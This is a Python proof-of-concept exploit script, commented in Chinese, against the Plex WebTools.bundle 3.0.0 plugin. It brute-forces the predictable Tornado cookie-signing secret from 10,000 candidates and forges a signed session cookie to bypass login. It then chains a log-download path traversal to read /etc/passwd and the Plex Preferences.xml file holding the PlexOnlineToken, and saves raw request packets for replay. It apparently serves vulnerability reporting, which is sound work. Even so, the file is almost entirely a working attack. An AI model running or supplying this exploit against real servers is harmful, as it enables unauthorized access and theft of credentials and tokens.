#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
poc_webtools_cookie_forge.py
================================================================================
Plex WebTools 插件会话密钥可预测 -> 离线伪造 Tornado 签名 Cookie -> 绕过登录
(WebTools.bundle 3.0.0 - predictable Tornado session signing key -> auth bypass)

原理
----
1) WebTools 用 Tornado 的 secure cookie。cookie_secret 由源码可推导:
      SharedSecret = VERSION + "." + randint(0,9999)     # VERSION 此时仍是占位符 "ERROR"
      cookie_secret = "__" + md5(SharedSecret + NAME) + "__"   # NAME = "WebTools"
   => cookie_secret 只有 10000 种可能: "__md5('ERROR.<0..9999>WebTools')__"
2) Tornado(1.x) 签名 Cookie 格式:
      Cookie: <NAME>=<base64(value)>|<timestamp>|<signature>
      signature = HMAC-SHA1(cookie_secret, NAME + base64(value) + str(timestamp))
   服务端 get_secure_cookie 只校验签名, 不校验值内容。
3) 枚举 0..9999 构造 Cookie, 打 /api/v3/logs/list:
      302 -> 签名错误; 200 -> 命中(即拿到有效密钥)
4) 命中后用同一 Cookie 调用日志下载接口读任意文件(路径穿越, 见另一份报告)。

用法
----
    python poc_webtools_cookie_forge.py                      # 默认目标, 全自动
    python poc_webtools_cookie_forge.py --base http://HOST:33400
    python poc_webtools_cookie_forge.py --i 7245             # 直接用报告中的已知候选验证
    python poc_webtools_cookie_forge.py --threads 20 --no-chain
    python poc_webtools_cookie_forge.py --outdir ./out
依赖: pip install requests
约束: 仅只读探测(GET), 不写文件/不删数据; 命中即停, 不做破坏性操作。
输出: 与脚本同目录:
    webtools_cookie_forge_result.json   命中密钥/Cookie/证据
    webtools_cookie_forge_packets.md    Yakit 可直接发送的原始请求包
    webtools_cookie_forge_log.txt       运行日志
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass

DEFAULT_BASE = "http://127.0.0.1:33400"
UA = "Mozilla/5.0"
TIMEOUT = 10

# 源码常量 (来自 ukdtom/WebTools.bundle 3.0.0: webSrv.py / consts.py)
VERSION_PLACEHOLDER = "ERROR"   # setConsts 之前 VERSION 的占位符
NAME_CANDIDATES = ["WebTools", "WebTools.bundle"]  # 插件目录名
# 报告实测命中的候选序号, 用于 --quick / 默认抢先验证
KNOWN_I = [7245]

STATE = {"base": DEFAULT_BASE, "outdir": os.path.dirname(os.path.abspath(__file__)),
         "log": None, "packets": []}


def log(msg=""):
    line = str(msg)
    print(line, flush=True)
    if STATE["log"]:
        try:
            STATE["log"].write(line + "\n")
            STATE["log"].flush()
        except Exception:
            pass


def banner(t):
    log("\n" + "=" * 78)
    log(t)
    log("=" * 78)


def netloc():
    return re.sub(r"^https?://", "", STATE["base"]).rstrip("/")


def build_raw(method, path, headers=None):
    h = {"Host": netloc(), "User-Agent": UA, "Connection": "close"}
    if headers:
        h.update(headers)
    lines = [f"{method} {path} HTTP/1.1"] + [f"{k}: {v}" for k, v in h.items()] + [""]
    return "\r\n".join(lines)


def add_packet(title, raw):
    STATE["packets"].append((title, raw))


def http(method, path, headers=None, timeout=TIMEOUT, allow_redirects=False, tag=""):
    url = path if path.startswith("http") else STATE["base"] + path
    h = {"User-Agent": UA, "Connection": "close"}
    if headers:
        h.update(headers)
    try:
        r = requests.request(method, url, headers=h, timeout=timeout,
                             verify=False, allow_redirects=allow_redirects)
        if tag:
            log(f"[{tag}] {method} {path} -> HTTP {r.status_code} "
                f"(Location={r.headers.get('Location')}) len={len(r.content)}")
        return r
    except Exception as e:
        if tag:
            log(f"[{tag}] {method} {path} !!! {type(e).__name__}: {e}")
        return None


# --------------------------------------------------------------------- 伪造算法
def candidate_secret(i, name=NAME_CANDIDATES[0], prefix=VERSION_PLACEHOLDER):
    """cookie_secret = '__' + md5(prefix + '.' + i + name) + '__'"""
    shared = f"{prefix}.{i}"
    return "__" + hashlib.md5((shared + name).encode()).hexdigest() + "__"


def sign_v1(secret, name, value, ts):
    """Tornado 1.x _create_signature_v1: HMAC-SHA1(secret, name + value + str(ts))"""
    msg = name + value + str(ts)
    return hmac.new(secret.encode(), msg.encode(), hashlib.sha1).hexdigest()


def build_cookie(secret, name="WebTools", raw_value=b"1", ts=None):
    ts = int(ts if ts is not None else time.time())
    value_b64 = base64.b64encode(raw_value).decode()          # b"1" -> "MQ=="
    sig = sign_v1(secret, name, value_b64, ts)
    cookie = f"{name}={value_b64}|{ts}|{sig}"
    return cookie, sig, ts, value_b64


def probe_cookie(cookie, path="/api/v3/logs/list", session=None):
    """302/401 -> 签名错误; 200 -> 命中"""
    try:
        s = session or requests
        r = s.get(STATE["base"] + path,
                  headers={"User-Agent": UA, "Cookie": cookie, "Connection": "close"},
                  timeout=TIMEOUT, verify=False, allow_redirects=False)
        return r.status_code, r
    except Exception:
        return None, None


# --------------------------------------------------------------------- 检查项
def step0_fingerprint():
    banner("[0] 指纹: 确认目标是 WebTools 且版本已知")
    r = http("GET", "/version", tag="F0")
    ver = None
    if r is not None and r.status_code == 200:
        try:
            j = r.json()
            ver = j.get("version") if isinstance(j, dict) else None
        except Exception:
            m = re.search(r"(\d+\.\d+\.\d+)", r.text or "")
            ver = m.group(1) if m else None
    log(f"[0] Server={r.headers.get('Server') if r is not None else None} version={ver}")
    r2 = http("GET", "/", tag="F0")
    loc = r2.headers.get("Location") if r2 is not None else None
    log(f"[0] GET / -> {r2.status_code if r2 else None} Location={loc} (未登录应 302 /login)")
    add_packet("指纹 /version", build_raw("GET", "/version"))
    return ver


def brute_secret(threads, try_known=True, limit=10000, delay=0.0):
    """枚举候选 cookie_secret, 命中即返回 (i, name, secret, cookie, signature)"""
    banner("[1] 枚举 cookie_secret 并离线伪造 Cookie")
    log(f"[1] 候选空间: {len(NAME_CANDIDATES)} x {limit} ; 线程={threads}")

    # 1) 先试已知候选(报告实测 i=7245), 让审核方秒级复核
    quick = []
    if try_known:
        for name in NAME_CANDIDATES:
            for i in KNOWN_I:
                quick.append((i, name))
    for (i, name) in quick:
        secret = candidate_secret(i, name)
        cookie, sig, ts, vb = build_cookie(secret)
        st, _ = probe_cookie(cookie)
        log(f"[1][quick] i={i} name={name} secret={secret} -> HTTP {st}")
        if st == 200:
            log(f"[1] *** 命中(已知候选): i={i} secret={secret} ***")
            return i, name, secret, cookie, sig, ts, vb

    # 2) 全量并发枚举
    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=threads,
                                            pool_maxsize=threads, max_retries=0)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    hit = {"done": False, "res": None}

    def worker(i, name):
        if hit["done"]:
            return None
        secret = candidate_secret(i, name)
        cookie, sig, ts, vb = build_cookie(secret)
        st, _ = probe_cookie(cookie, session=s)
        if delay:
            time.sleep(delay)
        if st == 200:
            return (i, name, secret, cookie, sig, ts, vb)
        return None

    tasks = [(i, name) for name in NAME_CANDIDATES for i in range(limit)]
    done = 0
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(worker, i, n): (i, n) for (i, n) in tasks}
        for f in as_completed(futs):
            done += 1
            res = f.result()
            if res:
                hit["done"] = True
                hit["res"] = res
                for ff in futs:
                    ff.cancel()
                break
            if done % 500 == 0:
                log(f"[1] 已尝试 {done}/{len(tasks)} ...")
    if hit["res"]:
        i, name, secret, cookie, sig, ts, vb = hit["res"]
        log(f"[1] *** 命中: i={i} name={name} secret={secret} ***")
        return hit["res"]
    log("[1] 10000 候选全部未命中 -> 目标可能已修复或 version 不是 3.0.0")
    return None


def step2_confirm(cookie, name):
    banner("[2] 用伪造 Cookie 证明登录态成立 (对照: 不带 Cookie)")
    r_ok = http("GET", "/api/v3/logs/list", headers={"Cookie": cookie}, tag="H2")
    r_no = http("GET", "/api/v3/logs/list", tag="H2")
    add_packet("伪造Cookie访问日志列表(200=已登录)", build_raw("GET", "/api/v3/logs/list", {"Cookie": cookie}))
    add_packet("对照: 不带Cookie(302=未登录)", build_raw("GET", "/api/v3/logs/list"))
    ok = r_ok is not None and r_ok.status_code == 200
    no = r_no is not None and r_no.status_code in (301, 302)
    log(f"[2] 带Cookie={r_ok.status_code if r_ok else None} 不带Cookie={r_no.status_code if r_no else None} "
        f"-> {'验证通过: Cookie 即为有效登录态' if (ok and no) else '对照不成立, 请人工确认'}")
    # 额外高价值接口
    for p in ("/api/v3/settings/getsettings", "/api/v3/techinfo/getinfo"):
        rr = http("GET", p, headers={"Cookie": cookie}, tag="H2")
        if rr is not None and rr.status_code == 200:
            add_packet(f"伪造Cookie访问 {p}", build_raw("GET", p, {"Cookie": cookie}))
    return ok


def step3_chain(cookie):
    banner("[3] 下游利用: 伪造 Cookie + 日志下载路径穿越 -> 读任意文件")
    targets = [
        ("/%2Fetc%2Fpasswd", "系统账号文件"),
        ("/%2Fconfig%2FLibrary%2FApplication%20Support%2FPlex%20Media%20Server%2FPreferences.xml",
         "Plex 核心配置(含 PlexOnlineToken)"),
    ]
    hits = []
    for path, desc in targets:
        full = "/api/v3/logs/download" + path
        r = http("GET", full, headers={"Cookie": cookie}, tag="H3")
        if r is not None and r.status_code == 200 and r.content:
            body = r.text[:200].replace("\n", " ")
            log(f"[3] *** 命中: {desc} -> HTTP 200, {len(r.content)} bytes | {body}")
            add_packet(f"路径穿越读取 {desc}", build_raw("GET", full, {"Cookie": cookie}))
            hits.append({"path": full, "desc": desc, "bytes": len(r.content),
                         "sample": r.text[:300]})
        else:
            log(f"[3] {desc}: HTTP {r.status_code if r else None}")
    return hits


# --------------------------------------------------------------------- 输出
def write_outputs(result):
    out = STATE["outdir"]
    jpath = os.path.join(out, "webtools_cookie_forge_result.json")
    with open(jpath, "w", encoding="utf-8") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)

    ppath = os.path.join(out, "webtools_cookie_forge_packets.md")
    with open(ppath, "w", encoding="utf-8") as f:
        f.write("# WebTools 会话密钥伪造 PoC - Yakit 可用原始请求包\n\n")
        f.write(f"- 目标: {STATE['base']}\n- 时间: {datetime.now():%Y-%m-%d %H:%M:%S}\n")
        f.write("- 用法: 复制代码块 -> Yakit 数据包/Repeater 原始请求(Raw) 模式 -> 发送\n\n")
        if result.get("secret"):
            f.write(f"- 命中 secret: `{result['secret']}` (i={result.get('i')}, name={result.get('name')})\n\n")
        for title, raw in STATE["packets"]:
            f.write(f"## {title}\n\n```http\n{raw}\n```\n\n")
    return jpath, ppath


def main():
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default=DEFAULT_BASE)
    ap.add_argument("--outdir", default=None)
    ap.add_argument("--threads", type=int, default=10)
    ap.add_argument("--i", type=int, default=None, help="只验证指定候选序号(如 7245)")
    ap.add_argument("--secret", default=None, help="直接提供已知 cookie_secret")
    ap.add_argument("--no-chain", action="store_true", help="跳过下游任意文件读取")
    ap.add_argument("--no-quick", action="store_true", help="跳过已知候选, 直接全量枚举")
    args = ap.parse_args()

    STATE["base"] = args.base.rstrip("/")
    if args.outdir:
        STATE["outdir"] = args.outdir
    os.makedirs(STATE["outdir"], exist_ok=True)
    STATE["log"] = open(os.path.join(STATE["outdir"], "webtools_cookie_forge_log.txt"),
                        "w", encoding="utf-8", errors="replace")

    log(f"# 目标   : {STATE['base']}")
    log(f"# 输出   : {STATE['outdir']}")
    log(f"# 时间   : {datetime.now():%Y-%m-%d %H:%M:%S}")
    log("# 说明   : 只读探测, 命中即停")

    ver = step0_fingerprint()

    found = None
    if args.secret:
        cookie, sig, ts, vb = build_cookie(args.secret)
        st, _ = probe_cookie(cookie)
        log(f"[1] 指定 secret 直接验证: HTTP {st}")
        if st == 200:
            found = (None, args.secret, args.secret, cookie, sig, ts, vb)
    elif args.i is not None:
        secret = candidate_secret(args.i)
        cookie, sig, ts, vb = build_cookie(secret)
        st, _ = probe_cookie(cookie)
        log(f"[1] --i {args.i} secret={secret} -> HTTP {st}")
        if st == 200:
            found = (args.i, NAME_CANDIDATES[0], secret, cookie, sig, ts, vb)
    else:
        found = brute_secret(args.threads, try_known=not args.no_quick)

    result = {"target": STATE["base"], "version": ver, "time": datetime.now().isoformat(),
              "vulnerable": bool(found)}
    if found:
        i, name, secret, cookie, sig, ts, vb = found
        result.update({"i": i, "name": name, "secret": secret, "cookie": cookie,
                       "signature": sig, "timestamp": ts, "value_b64": vb})
        step2_confirm(cookie, name)
        if not args.no_chain:
            result["chain"] = step3_chain(cookie)
    else:
        log("\n[!] 未枚举到有效密钥: 可能已修复/版本不符/网络不可达。")

    jpath, ppath = write_outputs(result)
    log("\n" + "=" * 78)
    log(f"# 完成: vulnerable={result['vulnerable']}")
    log(f"#   {jpath}")
    log(f"#   {ppath}")
    log("=" * 78)
    if STATE["log"]:
        STATE["log"].close()


if __name__ == "__main__":
    main()
